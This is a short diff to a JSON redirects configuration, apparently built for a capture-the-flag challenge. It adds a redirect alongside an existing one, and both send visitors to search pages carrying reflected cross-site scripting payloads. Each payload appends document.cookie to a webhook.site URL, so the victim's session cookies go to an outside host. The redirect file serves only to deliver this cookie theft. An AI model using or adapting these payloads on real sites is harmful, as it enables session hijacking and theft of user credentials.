@@ -1,6 +1,10 @@
 {
   "redirects": [
     {
+      "source":"/nhnc2",
+      "destination":"http://miday_revenge_aaaaa.nicewhite.eu.org:60005/search?search=%22%3E%3Cwindow.location=\"https://webhook.site/c0a1d835-d7e9-4dcc-add9-8c92f436e2a0/\"%2bdocument.cookie%3C/script%3E"
+    },
+    {
       "source":"/nhnc",
       "destination":"http://miday_ahdnsivs.nicewhite.eu.org:60007/search?search=\"><script>window.location=\"https://webhook.site/c0a1d835-d7e9-4dcc-add9-8c92f436e2a0/\"%2bdocument.cookie</script>"
     },
